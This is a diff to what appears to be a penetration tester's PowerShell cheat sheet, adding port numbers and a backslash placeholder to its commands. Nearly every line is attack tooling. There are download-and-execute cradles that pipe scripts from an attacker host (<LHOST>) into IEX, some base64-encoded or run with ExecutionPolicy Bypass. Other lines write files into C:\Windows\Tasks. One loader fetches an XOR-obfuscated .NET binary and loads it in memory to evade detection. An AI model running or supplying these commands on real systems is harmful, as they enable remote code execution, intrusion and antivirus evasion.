@@ -1,7 +1,7 @@
 % powershell/misc
 
 # base64 encode command string
-$text = "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/run.txt') | IEX"
+$text = "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/run.txt') | IEX"
 $b64 = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
 powershell -enc $b64
 
@@ -15,11 +15,11 @@ powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRe
 # fileless download
 $content = iwr http://<LHOST>/win/<FILENAME> -UseBasicParsing
 $content = iwr http://<LHOST>:8000/<FILENAME> -UseBasicParsing
-$text_only_no_bytes = (New-Object System.Net.WebClient).DownloadString('http://<LHOST>/run.txt')
+$text_only_no_bytes = (New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/run.txt')
 
 # download file
-(New-Object System.Net.WebClient).DownloadFile("http://<LHOST>/<FILENAME>", "C:\Windows\Tasks\<FILENAME>")
-iwr http://<LHOST>/<FILENAME> -o C:/Windows/Tasks/<FILENAME>
+(New-Object System.Net.WebClient).DownloadFile("http://<LHOST>:8000/<FILENAME>", "C:<BS>Windows<BS>Tasks<BS><FILENAME>")
+iwr http://<LHOST>:8000/<FILENAME> -o C:/Windows/Tasks/<FILENAME>
 
 # detect password reuse for different accounts (test needed)
 $password = "Aa111111"; 
@@ -35,3 +35,4 @@ $byteArray = [IO.File]::ReadAllBytes("$pwd\\<CSHARP_BIN>.exe.xored"); $KeyArray 
 $byteArray = (New-Object System.Net.WebClient).DownloadData("http://<LHOST>/win/<CSHARP_BIN>.exe.xored"); $KeyArray = @(52, 86, 66, 23, 61); $keyposition = 0; for ($i = 0; $i -lt $byteArray.count; $i++) { $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; $keyposition += 1; if ($keyposition -eq $keyArray.Length) { $keyposition = 0 ; } }; [Reflection.Assembly]::Load([byte[]]$byteArray); [<NAMESPACE>.<CLASSNAME>]::Main("<ARGUMENTS>".split(' '));
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
+$ BS: echo '\'
